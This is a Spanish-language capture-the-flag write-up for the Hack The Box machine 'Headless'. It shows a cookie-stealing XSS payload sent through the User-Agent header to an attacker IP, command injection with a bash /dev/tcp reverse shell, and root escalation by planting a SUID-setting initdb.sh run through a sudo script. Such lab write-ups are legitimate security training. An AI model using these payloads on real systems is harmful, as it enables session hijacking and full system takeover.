# Headless

![Pasted image 20240411152135](https://github.com/JoseVazquez101/Writteups/assets/111292579/93429699-26bf-4fc2-882c-4b6241365fd1)

***
- Source: https://app.hackthebox.com/machines/Headless
- OS: ``Linux``.
- Dificultad: ``Easy``.
- IP: ``10.10.11.8``.
- Temas: `XSS Reflected`, `Cookie Hijacking`, `Linux PrivEsc`.
***
#### Recon:

- Primero hacemos un escaneo de puertos con `nmap`, vemos dos puertos abiertos:

~~~bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.10.11.8
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-11 17:22 EDT
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 17:22
Scanning 10.10.11.8 [65535 ports]
Discovered open port 22/tcp on 10.10.11.8
Discovered open port 5000/tcp on 10.10.11.8
Completed SYN Stealth Scan at 17:23, 35.68s elapsed (65535 total ports)
Initiating Service scan at 17:23
Scanning 2 services on 10.10.11.8
Completed Service scan at 17:25, 132.23s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.8.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 17:25
Completed NSE at 17:25, 0.01s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 17:25
Stats: 0:02:51 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE: Active NSE Script Threads: 1 (1 waiting)
NSE Timing: About 75.00% done; ETC: 17:25 (0:00:01 remaining)
Completed NSE at 17:25, 11.04s elapsed
Nmap scan report for 10.10.11.8
Host is up, received user-set (5.1s latency).
Scanned at 2024-04-11 17:22:25 EDT for 179s
Not shown: 59447 closed tcp ports (reset), 6086 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
5000/tcp open  upnp?   syn-ack ttl 63
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
~~~

- La página web en el puerto 5000 no parece muy prometedora, ya que parece estar aún bajo construcción:

![Pasted image 20240411153145](https://github.com/JoseVazquez101/Writteups/assets/111292579/7a88bfb2-2519-41a8-bccf-ac4d8876988d)

- Con una enumeración de directorios encontré dos, uno llamado `dashboard` al cual no tenemos acceso y otro llamado `support`.
- Si presionamos el botón nos redirigirá a un apartado para contactarnos con el soporte.
- Intenté enviar el siguiente payload en el apartado de `Message` y recibí un mensaje bastante curioso:

~~~html
<script>alert("XSS");</script>
~~~

![Pasted image 20240411153434](https://github.com/JoseVazquez101/Writteups/assets/111292579/ed583b76-ae88-4af3-bd2c-7e7131e54448)

- Por la respuesta del mensaje podemos deducir que esto le llega al administrador directamente, por lo que podemos intentar robar su cookie de sesión.
- Para esto, me creé un archivo llamado `rubberCookie.js`, el cual se encargará de obtener la cookie y enviármela en un parámetro `GET`, aplicando de cierta manera una XSS reflejada:

~~~bash
var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.16.50/?cookie=' + document.cookie);
request.send();
~~~

- El payload que enviaremos será este:

~~~js
<script src='http://10.10.16.50/rubberCookie.js'></script>
~~~

- solo debemos insertarlo en el `User-Agent`, de la siguiente manera:

~~~bash
POST /support HTTP/1.1

Host: 10.10.11.8:5000
User-Agent: <script src='http://10.10.16.50/rubberCookie.js'></script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Origin: http://10.10.11.8:5000
Connection: close
Referer: http://10.10.11.8:5000/support
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Upgrade-Insecure-Requests: 1

fname=a&lname=a&email=a%40a.com&phone=3333&message=xd;
~~~

- Ahora solo deberíamos ponernos en escucha con un servidor de Python, primer deberíamos ver como el servidor obtiene nuestro archivo `rubberCookie.js` e inmediatamente lo interpreta:

~~~bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.8 - - [11/Apr/2024 18:53:04] "GET /rubberCookie.js HTTP/1.1" 200 -
10.10.11.8 - - [11/Apr/2024 18:53:06] "GET /?cookie=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 --
~~~

***

#### Explotación:

- Muy bien, con esta cookie ya tenemos acceso de administrador en el directorio de `dashboard`:

![Pasted image 20240411161913](https://github.com/JoseVazquez101/Writteups/assets/111292579/60ced685-34a1-4343-933d-febb3740c33e)

- Si interceptamos la petición podemos ver que se manda data bastante sencilla.
- Estaba probando tonterías y concatené un comando, esto funcionó xd:

![Pasted image 20240411162511](https://github.com/JoseVazquez101/Writteups/assets/111292579/0da12c93-1fce-410d-bd49-907e88623f43)

- Bastaría con mandarnos una revshell:

~~~bash
bash -c 'sh -i >& /dev/tcp/10.10.16.50/4444 0>&1'
~~~

- Encodeamos esta en URL y la mandamos concatenada con `;` a un lado del campo `data`.
- Si nos ponemos en escucha, deberíamos ganar acceso:

~~~bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.50] from (UNKNOWN) [10.10.11.8] 56958
bash: cannot set terminal process group (1354): Inappropriate ioctl for device
bash: no job control in this shell
dvir@headless:~/app$ 
~~~

- Hacemos un tratamiento de TTY:

~~~bash
script /dev/null -c bash
^Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
~~~

***
#### PrivEsc:

- Vemos que podemos ejecutar un recurso `syscheck` como root:

~~~bash
dvir@headless:~/app$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
~~~

- Analizando un poco el recurso podemos ver algunas cosas:

~~~bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
~~~

- Utiliza pgrep para verificar si el proceso initdb.sh está en ejecución.
- Si el proceso no se encuentra en ejecución, muestra un mensaje indicando que el servicio de base de datos no está en ejecución y luego ejecuta initdb.sh.
- Si el proceso se encuentra en ejecución, muestra un mensaje indicando que el servicio de base de datos está en ejecución.
- Lo ejecuté varias veces y siempre me marcaba que estaba deshabilitado, así que no tenemos que matar el proceso, cosas de CTF xd.
- Ahora bien, debemos cambiar el contenido de este script por una instrucción para asignar SUID al binario de bash:

~~~bash
dvir@headless:~/app$ echo '#!/bin/bash' > initdb.sh && echo "chmod u+s /bin/bash" >> initdb.sh
dvir@headless:~/app$ cat initdb.sh
#!/bin/bash
chmod u+s /bin/bash
~~~

- Ahora, ejecutamos el script y nos ejecutamos una bash privilegiada:

~~~bash
dvir@headless:~/app$ sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.05, 0.01, 0.00
Database service is not running. Starting it...
dvir@headless:~/app$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 Apr 24  2023 /bin/bash
dvir@headless:~/app$ /bin/bash -p
bash-5.2# whoami
root
~~~

